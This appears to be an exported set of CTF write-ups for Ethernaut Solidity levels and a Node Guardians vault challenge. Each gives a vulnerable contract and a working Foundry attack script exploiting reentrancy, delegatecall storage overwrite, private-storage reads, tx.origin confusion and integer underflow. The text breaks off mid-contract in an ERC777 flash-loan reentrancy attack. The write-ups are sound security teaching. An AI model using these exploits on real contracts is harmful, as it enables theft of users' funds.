'openzeppelin-contracts-08/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(block.timestamp \u003e timeLock); _; } else { _; } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,NaughtCoin} from \"../src/15.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address publicKey = vm.envAddress(\"PUBLIC_KEY\"); address addr = vm.envAddress(\"INSTANCE_15\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(); NaughtCoin nc = NaughtCoin(addr); nc.approve(address(attacker), nc.balanceOf(publicKey)); attacker.attack(address(nc)); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface NaughtCoin { function transfer(address _to, uint256 _value) external returns(bool); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool); function balanceOf(address account) external view returns (uint256); } contract Attacker { function attack(address _addr) public { NaughtCoin nc = NaughtCoin(_addr); nc.transferFrom(msg.sender, address(this), nc.balanceOf(msg.sender)); } } When using code that‚Äôs not your own, it‚Äôs a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you‚Äôre allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation."},"title":"Naught Coin"},"/projects/ethernaut/preservation-15486d553b7048eba93be9c33dcdd447/":{"data":{"":" This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.\nThe goal of this level is for you to claim ownership of the instance you are given.\nThings that might help\nLook into Solidity‚Äôs documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope. Understanding what it means for delegatecall to be context-preserving. Understanding how storage variables are stored and accessed. Understanding how casting works between different data types. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Preservation { // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } // set the time for timezone 1 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } // set the time for timezone 2 function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime; function setTime(uint _time) public { storedTime = _time; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,Preservation} from \"../src/16.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_16\"); address pubKey = vm.envAddress(\"PUBLIC_KEY\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(); attacker.attack(addr, pubKey); console.logAddress(Preservation(addr).owner()); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Preservation { function timeZone1Library() external returns(address); function setFirstTime(uint _timeStamp) external; function owner() external returns(address); } contract Attacker { // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); function attack(address _preservation, address newOwner) public { Preservation preservation = Preservation(_preservation); preservation.setFirstTime(uint160(address(this))); preservation.setFirstTime(uint160(address(newOwner))); } function setTime(uint _time) public { owner = address(uint160(_time)); } } As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables."},"title":"Preservation"},"/projects/ethernaut/privacy-0141c59931824d74a8311099eb338d5d/":{"data":{"":" title: Privacy weight: 13 type: docs prev: elevator next: gatekeeper-one\nLevel12 - ‚≠ê‚≠ê‚≠ê\nThe creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\nThings that might help:\nUnderstanding how storage works Understanding how parameter parsing works Understanding how casting works Tips:\nRemember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Privacy { bool public locked = true; // slot 0 uint256 public ID = block.timestamp; // slot 1 uint8 private flattening = 10; // slot 2 uint8 private denomination = 255; // slot 2 uint16 private awkwardness = uint16(block.timestamp); // slot 2 bytes32[3] private data; // [slot3, slot4, slot5] constructor(bytes32[3] memory _data) { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } for more details on storage layout read this article:\nbookmark\nSo, the _key is stored at slot 5 since it is data[2]:\n‚ûú ~/repos/ethernaut (main) cast storage --rpc-url $SEPOLIA_RPC_URL $INSTANCE_12 5 0xe32410e9fbc1f17b0f1d9a6ed141317f11c4b2a5d38981dfa025aacf8b708d7d Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Privacy} from \"../src/12.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_12\"); vm.startBroadcast(deployerPrivateKey); Privacy privacy = Privacy(addr); console.log('isLocked : %s', privacy.locked()); // vm.load() allows us to read arbitrary storage slot bytes16 key = bytes16(vm.load(address(privacy), bytes32(uint(5)))); privacy.unlock(key); console.log('isLocked : %s', privacy.locked()); vm.stopBroadcast(); } } Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3‚Äôs getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.\nIt can‚Äôt get much more complicated than what was exposed in this level. For more, check out this excellent article by ‚ÄúDarius‚Äù: How to read Ethereum contract storage\nMore info:\nbookmark"},"title":"Privacy"},"/projects/ethernaut/re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d/":{"data":{"":"","#":" The goal of this level is for you to steal all the funds from the contract.\nThings that might help:\nUntrusted contracts can execute code where you least expect it. Fallback methods Throw/revert bubbling Sometimes the best way to attack a contract is with another contract. See the \"?\" page above, section ‚ÄúBeyond the console‚Äù // SPDX-License-Identifier: MIT pragma solidity ^0.6.12; import 'openzeppelin-contracts-06/math/SafeMath.sol'; contract Reentrance { using SafeMath for uint256; mapping(address =\u003e uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] \u003e= _amount) { (bool result,) = msg.sender.call{value:_amount}(\"\"); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {} } üí° In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.\ntransfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.\nAlways assume that the receiver of the funds you are sending can be\nanother contract, not just a regular address. Hence, it can execute code\nin its payable fallback method and re-enter your contract, possibly messing up your state/logic.\nRe-entrancy is a common attack. You should always be prepared for it!\nThe DAO Hack The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.\nUse the Checks-Effects-Interactions PatternÔÉÅ Most functions will first perform some checks and they should be done first (who called the function, are the arguments in range, did they send enough Ether, does the person have tokens, etc.).\nAs the second step, if all checks passed, effects to the state variables of the current contract should be made. Interaction with other contracts should be the very last step in any function.\nEarly contracts delayed some effects and waited for external function calls to return in a non-error state. This is often a serious mistake because of the reentrancy problem explained above.\nNote that, also, calls to known contracts might in turn cause calls to unknown contracts, so it is probably better to just always apply this pattern.\nSolution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker} from \"../src/10.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_10\"); vm.startBroadcast(deployerPrivateKey); console.logUint(address(addr).balance); Attacker instance = new Attacker(payable(addr)); instance.attack{value: address(addr).balance}(); console.logUint(address(addr).balance); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Reentrance { function donate(address _to) external payable; function balanceOf(address _who) external view returns (uint balance); function withdraw(uint _amount) external; receive() external payable; } contract Attacker { Reentrance callee; constructor(address payable _callee) { callee = Reentrance(_callee); } function attack() public payable { uint amount = address(callee).balance; callee.donate{value: amount}(address(this)); callee.withdraw(amount); } receive() external payable { uint amount = address(callee).balance; // This check is made to prevent infinite loop if (amount != 0) { callee.withdraw(amount); } } } "},"title":"Re-entrancy"},"/projects/ethernaut/telephone-8b2069f0beb045b69400a28665c1d56c/":{"data":{"":" Claim ownership of the contract below to complete this level.\nThings that might help\nSee the \"?\" page above, section ‚ÄúBeyond the console‚Äù // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } This is one is pretty straight forward, here is the attacker contract we can deploy:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Telephone { function changeOwner(address _owner) external; } contract CoinFlipAttack { Telephone telephone; constructor(address target) { telephone = Telephone(target); } function attack() public { telephone.changeOwner(msg.sender); } } While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.\nAn example of a possible attack is outlined below.\nUse tx.origin to determine whose tokens to transfer, e.g. function transfer(address _to, uint _value) { tokens[tx.origin] -= _value; tokens[_to] += _value; } Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g. function () payable { token.transfer(attackerAddress, 10000); } In this scenario, tx.origin will be the victim‚Äôs address (while msg.sender will be the malicious contract‚Äôs address), resulting in the funds being transferred from the victim to the attacker. "},"title":"Telephone"},"/projects/ethernaut/token-4a8cb8765f8c412190f2db4a7989f9b5/":{"data":{"":" // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Token { function transfer(address _to, uint _value) external returns (bool); function balanceOf(address _owner) external view returns (uint balance); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_05\"); address publicKey = vm.envAddress(\"PUBLIC_KEY\"); vm.startBroadcast(deployerPrivateKey); Token token = Token(addr); uint balance = token.balanceOf(publicKey); console.logUint(balance); token.transfer(address(0), balance + 1); balance = token.balanceOf(publicKey); console.logUint(balance); vm.stopBroadcast(); } } The goal of this level is for you to hack the basic token contract below.\nYou are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.\nThings that might help:\nWhat is an odometer? Overflows are very common in solidity and must be checked for with control statements such as:\nif(a + c \u003e a) { a = a + c; } An easier alternative is to use OpenZeppelin‚Äôs SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:\na = a.add(c); If there is an overflow, the code will revert."},"title":"Token"},"/projects/ethernaut/vault-d8ba3eafb273440f9a492b042e65f214/":{"data":{"":" // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } Unlock the vault to pass the level!\nüí° It‚Äôs important to remember that marking a variable as private only prevents\nother contracts from accessing it. State variables marked as private and\nlocal variables are still publicly accessible.\nTo ensure that data is private, it needs to be encrypted before being\nput onto the blockchain. In this scenario, the decryption key should\nnever be sent on-chain, as it will then be visible to anyone who looks\nfor it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter."},"title":"Vault"},"/projects/node-guardians/":{"data":{"":"","#":" Node Guardians is a platform for builders, thinkers, and stakers. Their mission is to bolster innovative and promising crypto ecosystems, and contribute to the future of a decentralized internet. They do this through education and infrastructure. You can see my profile here ‚öîÔ∏è Price Oracle Attack Wintermute Rekt Cream Finance Rekt Poly Network Rekt "},"title":"Node Guardians"},"/projects/node-guardians/cream-finance-rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d/":{"data":{"":"","abstract#Abstract":"","abstract-1#Abstract":"","motivation#Motivation":"","motivation-1#Motivation":" https://rekt.news/cream-rekt/\nFlash Loan EIP : https://eips.ethereum.org/EIPS/eip-3156\nSimple Summary This ERC provides standard interfaces and processes for single-asset flash loans.\nAbstract A flash loan is a smart contract transaction in which a lender smart contract lends assets to a borrower smart contract with the condition that the assets are returned, plus an optional fee, before the end of the transaction. This ERC specifies interfaces for lenders to accept flash loan requests, and for borrowers to take temporary control of the transaction within the lender execution. The process for the safe execution of flash loans is also specified.\nMotivation Flash loans allow smart contracts to lend an amount of tokens without a requirement for collateral, with the condition that they must be returned within the same transaction.\nEarly adopters of the flash loan pattern have produced different interfaces and different use patterns. The diversification is expected to intensify, and with it the technical debt required to integrate with diverse flash lending patterns.\nSome of the high level differences in the approaches across the protocols include:\nRepayment approaches at the end of the transaction, where some pull the principal plus the fee from the loan receiver, and others where the loan receiver needs to manually return the principal and the fee to the lender. Some lenders offer the ability to repay the loan using a token that is different to what was originally borrowed, which can reduce the overall complexity of the flash transaction and gas fees. Some lenders offer a single entry point into the protocol regardless of whether you‚Äôre buying, selling, depositing or chaining them together as a flash loan, whereas other protocols offer discrete entry points. Some lenders allow to flash mint any amount of their native token without charging a fee, effectively allowing flash loans bounded by computational constraints instead of asset ownership constraints. First thing first, I want to have a look at the current state of the vault contract:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attack} from \"../src/Attack.sol\"; import {SharkVault, IERC20} from \"../src/Attack.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address INSTANCE = vm.envAddress(\"INSTANCE\"); vm.startBroadcast(deployerPrivateKey); SharkVault vault = SharkVault(INSTANCE); IERC20 gold = IERC20(vault.gold()); IERC20 seagold = IERC20(vault.seagold()); console.logAddress(address(gold)); console.logAddress(address(seagold)); console.logUint(gold.balanceOf(address(vault))); console.logUint(seagold.balanceOf(address(vault))); vm.stopBroadcast(); } } which gives me the following output :\nSo this is our target to still !\nNow here is the vault contract:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.19; import \"@openzeppelin/contracts/interfaces/IERC20.sol\"; contract SharkVault { // The Shark charges predatory interest rates... uint256 constant public INTEREST_RATE_PERCENT = 1; IERC20 immutable public gold; IERC20 immutable public seagold; struct LoanAccount { uint256 depositedGold; uint256 borrowedSeagold; uint256 lastBlock; } mapping(address =\u003e LoanAccount) private accounts; constructor( IERC20 _gold, IERC20 _seagold ) { gold = _gold; seagold = _seagold; } /** * @notice Deposit gold as collateral. * @param _amount Amount of gold to deposit. * @dev Gold must be approved for transfer beforehand. */ function depositGold(uint256 _amount) external payable { accounts[msg.sender].depositedGold += _amount; gold.transferFrom(msg.sender, address(this), _amount); } /** * @notice Withdraw gold collateral. * @param _amount Amount of gold to withdraw. * @dev Any existing seagold loan must still be * sufficiently collateralized. */ function withdrawGold(uint256 _amount) external payable { LoanAccount memory account = updatedAccount(msg.sender); account.depositedGold -= _amount; require(_hasEnoughCollateral(account), \"Undercollateralized $SEAGLD loan\"); accounts[msg.sender] = account; gold.transfer(msg.sender, _amount); } /** * @notice Borrow seagold. * @param _amount Amount of seagold to borrow. * @dev Seagold loan have be suffciently collateralized * by previously deposited gold. */ function borrow(uint256 _amount) external { LoanAccount memory borrowerAccount = updatedAccount(msg.sender); borrowerAccount.borrowedSeagold += _amount; // Fail if insufficient remaining balance of $SEAGOLD uint256 seagoldBalance = seagold.balanceOf(address(this)); require(_amount \u003c= seagoldBalance, \"Insufficient $SEAGLD to lend\"); // Fail if borrower has insufficient gold collateral require(_hasEnoughCollateral(borrowerAccount), \"Undercollateralized $SEAGLD loan\"); // Transfer $SEAGOLD and update records seagold.transfer(msg.sender, _amount); accounts[msg.sender] = borrowerAccount; } /** * @notice Repay borrowed seagold. * @param _amount Amount of seagold to repay. * @dev Seagold must be approved for transfer beforehand. */ function repay(uint256 _amount) external { LoanAccount memory account = updatedAccount(msg.sender); account.borrowedSeagold -= _amount; accounts[msg.sender] = account; seagold.transferFrom(msg.sender, address(this), _amount); } /** * @notice Liquidate an existing undercollateralized loan. * The smart contract effectively seizes the gold collateral. * @param _borrower Owner of the loan. */ function liquidate(address _borrower) external { LoanAccount memory borrowerAccount = updatedAccount(_borrower); require(!_hasEnoughCollateral(borrowerAccount), \"Borrower has good collateral\"); delete accounts[_borrower]; } /** * @notice Get the loan account of a user, with updated interest. * @param _accountOwner Owner of the loan. */ function updatedAccount( address _accountOwner ) public view returns (LoanAccount memory account) { account = accounts[_accountOwner]; if (account.borrowedSeagold \u003e 0) { uint256 blockDelta = block.number - account.lastBlock; uint256 interest = account.borrowedSeagold * blockDelta * INTEREST_RATE_PERCENT / 100; account.depositedGold = (account.depositedGold \u003e= interest) ? account.depositedGold - interest : 0; } account.lastBlock = block.number; } /** * @dev Returns true if `_account` is sufficiently collateralized by gold. * Collateral ratio =\u003e 1 GOLD : 0.75 SEAGOLD */ function _hasEnoughCollateral(LoanAccount memory _account) private pure returns (bool) { return (3 * _account.depositedGold \u003e= 4 * _account.borrowedSeagold); } } Since we are supposed to take advantage of a reentrancy attack, I‚Äôm looking for any miss ordered [checks ‚Üí internal state change ‚Üí outside communication] patern in the contract. In other word, I want to find something in the contract that update the internal state logic of the contract after talking with the outside world.\nAnd here we have it :\nfunction borrow(uint256 _amount) external { LoanAccount memory borrowerAccount = updatedAccount(msg.sender); borrowerAccount.borrowedSeagold += _amount; // Fail if insufficient remaining balance of $SEAGOLD uint256 seagoldBalance = seagold.balanceOf(address(this)); require(_amount \u003c= seagoldBalance, \"Insufficient $SEAGLD to lend\"); // Fail if borrower has insufficient gold collateral require(_hasEnoughCollateral(borrowerAccount), \"Undercollateralized $SEAGLD loan\"); // Transfer $SEAGOLD and update records seagold.transfer(msg.sender, _amount); \u003c================== accounts[msg.sender] = borrowerAccount; \u003c================= } Those last two line are very dangerous since transfer can be done to any malicious contract that will recall the borrow function before the accounnts[msg.sender] state is updated!\nThe first line of the function calls updatedAccount :\nfunction updatedAccount( address _accountOwner ) public view returns (LoanAccount memory account) { account = accounts[_accountOwner]; if (account.borrowedSeagold \u003e 0) { uint256 blockDelta = block.number - account.lastBlock; uint256 interest = account.borrowedSeagold * blockDelta * INTEREST_RATE_PERCENT / 100; account.depositedGold = (account.depositedGold \u003e= interest) ? account.depositedGold - interest : 0; } account.lastBlock = block.number; } but this call presuppose that account = accounts[_accountOwner]; is the correct value, which we know is wrong since we can call withdraw as many time as we want without changing the accounts[msg.sender] . In order to create an attack, first we need so GOLD collateral. Let‚Äôs see how many GOLD we can borrow from the flash lender:\nSo, 1 000 Gold token.\nAnd we want to still 3 000 SeaGold.\nIt is said that : For every 1000 Gold deposited, users can borrow up to 75 Seagold.\nSo we‚Äôll be able to borrow 750 Seagold on each call which is perfet since 3 000 / 750 = 4 !\nSo, here are the step I‚Äôm going to implement;\nDeposit the 1000 Gold from the Flashloan contract into the SharkVault contract Call borrow() 750 SeaGold x4 thanks to the contract breach Make a last borrow() of 0 SeaGold so I don‚Äôt have to repay anything Withdraw the 1000 Gold from the SharkVault contract and repay back the Flashloan contract Now it still remains one problem, how to take advantage of the seagold transfer method ?\nlooking at the decompiled version of the function from goerli scan :\ndef transfer(address _to, uint256 _value) payable: require calldata.size - 4 \u003e=Œì√á‚ñì 64 require _to == _to require _value == _value if not caller: revert with 0, 'ERC777: transfer from the zero address' if not _to: revert with 0, 'ERC777: transfer to the zero address' static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with: gas gas_remaining wei args caller, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895 if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] require return_data.size \u003e=Œì√á‚ñì 32 require ext_call.return_data == ext_call.return_data[12 len 20] if ext_call.return_data[12 len 20]: require ext_code.size(addr(ext_call.return_data)) call addr(ext_call.return_data).tokensToSend(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with: gas gas_remaining wei args caller, caller, addr(_to), _value, 192, 224, 0, 0 if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] if balanceOf[caller] \u003c _value: revert with 0, 'ERC777: transfer amount exceeds balance' balanceOf[caller] -= _value if balanceOf[addr(_to)] \u003e balanceOf[addr(_to)] + _value: revert with 'NH{q', 17 balanceOf[addr(_to)] += _value log Sent(address operator, address from, address to, uint256 amount, bytes holderData, bytes operatorData): _value, 96, 128, 0, 0, caller, caller, _to, log Transfer( address from=_value, address to=caller, uint256 tokens=_to) static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with: gas gas_remaining wei args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] require return_data.size \u003e=Œì√á‚ñì 32 require ext_call.return_data == ext_call.return_data[12 len 20] if ext_call.return_data[12 len 20]: require ext_code.size(addr(ext_call.return_data)) call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with: gas gas_remaining wei args caller, caller, addr(_to), _value, 192, 224, 0, 0 if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] return 1 and the first transaction log from my first POC (see further below) we can see that their is some call to getInterfaceImplementer() function:\nHere is the correponding eip : https://eips.ethereum.org/EIPS/eip-1820\nSimple Summary This standard defines a universal registry smart contract where any address (contract or regular account) can register which interface it supports and which smart contract is responsible for its implementation.\nThis standard keeps backward compatibility with ERC-165.\nAbstract This standard defines a registry where smart contracts and regular accounts can publish which functionality they implement‚Äîeither directly or through a proxy contract.\nAnyone can query this registry to ask if a specific address implements a given interface and which smart contract handles its implementation.\nThis registry MAY be deployed on any chain and shares the same address on all chains.\nInterfaces with zeroes (0) as the last 28 bytes are considered ERC-165 interfaces, and this registry SHALL forward the call to the contract to see if it implements the interface.\nThis contract also acts as an ERC-165 cache to reduce gas consumption.\nMotivation There have been different approaches to define pseudo-introspection in Ethereum. The first is ERC-165 which has the limitation that it cannot be used by regular accounts. The second attempt is ERC-672 which uses reverse ENS. Using reverse ENS has two issues. First, it is unnecessarily complicated, and second, ENS is still a centralized contract controlled by a multisig. This multisig theoretically would be able to modify the system.\nThis standard is much simpler than ERC-672, and it is fully decentralized.\nThis standard also provides a unique address for all chains. Thus solving the problem of resolving the correct registry address for different chains.\nBack to the decompiled code:\nstatic call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with: gas gas_remaining wei args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b after a quick google search we can find that:\nbookmark\nSo apparently, Seagold is not just an ERC20 but rather an ERC777\nThe question is: How can we trigger a fallback like functionality from ERC777 transfer call ?\nhttps://ethereum.stackexchange.com/a/84702\nHere we have it :\nbookmark\nWe can clearly see here that if we implement the tokensReceived function we can have a re-entrancy attack:\nSo let‚Äôs implement the function in our flashloan contract + we can see that the address is called on the return data which is the _to address from the params of the function which is msg.sender which is our flash loan contract !\nOnce we have implemented the function there is still one thing to do:\nWe can see that there is no interface implementer registered, so there are no call that is made here :\nif ext_call.return_data[12 len 20]: require ext_code.size(addr(ext_call.return_data)) call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with: gas gas_remaining wei args caller, caller, addr(_to), _value, 192, 224, 0, 0 ext_call.return_data is the result of getInterfaceImplementer.\nSo first we have to find a way to add an interface implementer in the ERC1830Registry.\nWe can do so with the following function:\n/// @notice Sets the contract which implements a specific interface for an address. /// Only the manager defined for that address can set it. /// (Each address is the manager for itself until it sets a new manager.) /// @param _addr Address for which to set the interface. /// (If '_addr' is the zero address then 'msg.sender' is assumed.) /// @param _interfaceHash Keccak256 hash of the name of the interface as a string. /// E.g., 'web3.utils.keccak256(\"ERC777TokensRecipient\")' for the 'ERC777TokensRecipient' interface. /// @param _implementer Contract address implementing '_interfaceHash' for '_addr'. function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external { address addr = _addr == address(0) ? msg.sender : _addr; require(getManager(addr) == msg.sender, \"Not the manager\"); require(!isERC165Interface(_interfaceHash), \"Must not be an ERC165 hash\"); if (_implementer != address(0) \u0026\u0026 _implementer != msg.sender) { require( ERC1820ImplementerInterface(_implementer) .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC, \"Does not implement the interface\" ); } interfaces[addr][_interfaceHash] = _implementer; emit InterfaceImplementerSet(addr, _interfaceHash, _implementer); } ‚Üí _addr (FlashLoan address)\n‚Üí _interfaceHash (0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b)\n‚Üí _interfaceHash (FlashLoan address)\nSo here is the call I made :\nERC1820Registry registry = ERC1820Registry(REGISTRY); registry.setInterfaceImplementer(address(flashLoan), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(flashLoan)); but I felt onto:\nQuestion: who is the manager ?\nIt turns out that a contract is its own manager ! hehe\nSo I moved my code inside my FlashLoan attacker üòà\nAnd here is a first peek at my set up:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.19; // Here we can find the standard interface for the ERC20. Don't forget that we find // out that the seagold is actually an ERC777 token ! interface IERC20 { event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool); } // This is the registry that tells for a given contract which interface its supports // There is a getter and a setter. // The manager of a contrat is the contract itself by default. interface ERC1820Registry { function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address); function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external; } // This is the vault we are going to attack interface SharkVault { // The Shark charges predatory interest rates... function INTEREST_RATE_PERCENT() external returns(uint256); function gold() external returns(address); function seagold() external returns(address); struct LoanAccount { uint256 depositedGold; uint256 borrowedSeagold; uint256 lastBlock; } function depositGold(uint256 _amount) external ; function withdrawGold(uint256 _amount) external payable; function borrow(uint256 _amount) external; function repay(uint256 _amount) external; function liquidate(address _borrower) external; function updatedAccount( address _accountOwner ) external view returns (LoanAccount memory account); } // This is one of the interface of our attacker contract. // onFlashLoan will be called by the FlashLender (see the next interface) // when this function is called we actually have the gold token in the // attacker contract interface IERC3156FlashBorrower { function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data ) external returns (bytes32); } // This one is the interface for the flash loan borrower. // This is where we find the initial golds that will boostrap the whole attack // and the ones that we have to repay at the end of the flashloan (+ fee) but there // is no fees in this scenario. interface IERC3156FlashLender { function maxFlashLoan( address token ) external view returns (uint256); function flashFee( address token, uint256 amount ) external view returns (uint256); function flashLoan( IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data ) external returns (bool); } // This is the second interface that our FlashLoan contract implement // It is basically where the re-entrancy attack begins ! interface IERC777TokensRecipient { function tokensReceived( address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData ) external; } // And there it is ! The FlashLoan attacker contract wich implements the whole // attack logic contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient { IERC20 gold; IERC20 seagold; IERC3156FlashLender flashLender; SharkVault 